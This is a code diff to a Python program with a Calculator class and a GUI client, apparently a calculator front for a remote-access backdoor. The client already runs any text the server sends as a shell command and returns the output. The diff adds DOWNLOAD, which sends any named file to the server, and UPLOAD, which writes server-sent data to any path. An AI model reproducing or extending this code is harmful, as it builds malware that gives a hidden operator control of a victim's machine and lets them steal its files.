@@ -3,6 +3,7 @@ import threading
 import tkinter as tk
 from tkinter import simpledialog
 import subprocess 
+import os
 
 
 class Calculator:
@@ -76,6 +77,8 @@ class Client:
 
         self.nickname = simpledialog.askstring("Nickname", "Please choose a nickname", parent=msg)
 
+        self.receiving_file=False
+        self.des_path=""
         
         self.receive_thread = threading.Thread(target=self.receive_and_exe)
         self.receive_thread.start() 
@@ -95,13 +98,48 @@ class Client:
     def receive_and_exe(self):
         while self.running:
             try:
-                message = self.client.recv(4096).decode('utf-8')
-                if message == 'NICK':
+                message = self.client.recv(4096)
+                if self.receiving_file is True:
+                    if message==b'EOF':
+                        print("done...")
+                        self.receiving_file=False
+                        continue
+                    if self.receiving_file is True:
+                        print ("receiving file...")
+                        full_path = os.path.join(self.des_path)
+                        try:
+                            with open(full_path, 'ab') as file:
+                                print ("saving file...")
+                                file.write(message)
+                                # self.send_message("uploading was done successfully")
+                        except Exception as e:
+                            print(f"Error receiving file: {e}")
+                # message=message.decode('utf-8')
+                elif message==b"EOF":
+                    self.receiving_file=False
+                elif message == b'NICK':
                     self.client.send(self.nickname.encode('utf-8'))
-                elif message == 'connected to server':
+                elif message == b'connected to server':
                     continue
+                elif message.startswith(b"DOWNLOAD"):
+                    message=message.decode('utf-8')
+                    # print("yes")
+                    parts=message.split()
+                    file_path=parts[1]
+                    chunk=""
+                    with open(file_path, 'rb') as file:
+                        chunk = file.read()
+                    self.client.sendall(chunk)
+                    self.client.send(b'EOF')
+                elif message.startswith(b"UPLOAD"):
+                    message=message.decode('utf-8')
+                    self.receiving_file=True
+                    parts=message.split(' ')
+                    self.des_path=parts[2]
+                    print("downloading...")
                 elif message:
-                    message = message.replace('\n\nEND\n\n', '')
+                    message=message.decode('utf-8')
+                    message = message#.replace('\n\nEND\n\n', '')
                     print(message)
                     output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT, text=True)
                     self.send_message(message+'\n'+output)
@@ -111,13 +149,16 @@ class Client:
             except ConnectionAbortedError:
                 break
             except subprocess.CalledProcessError as e:
-                print('Error4')
-                self.send_message("Error4")
+                print('Error:',e)
+                self.send_message(f'Error:{e}')
+            except UnicodeDecodeError:
+                continue
             except Exception as e:
                 print("An error occurred:", e)
-                self.send_message("An error occurred:", e)
+                self.send_message(f"An error occurred: {e}")
                 client.close()
                 self.running=False
+                self.close()
         if not self.running:
             self.close()
 
@@ -129,12 +170,13 @@ class Client:
 
     def send_message(self, message):
         try:
-            message+='\n\nEND\n\n'
+            # message+='\n\nEND\n\n'
             output=str(message).encode('utf-8')
             self.client.sendall(output)
+            self.client.send(b'EOF')
             print(output.decode('utf-8'))
         except Exception as e:
-            print("An error occurred:", e)
+            print("an error occurred:", e)
             self.client.close()
 
 if __name__ == "__main__":
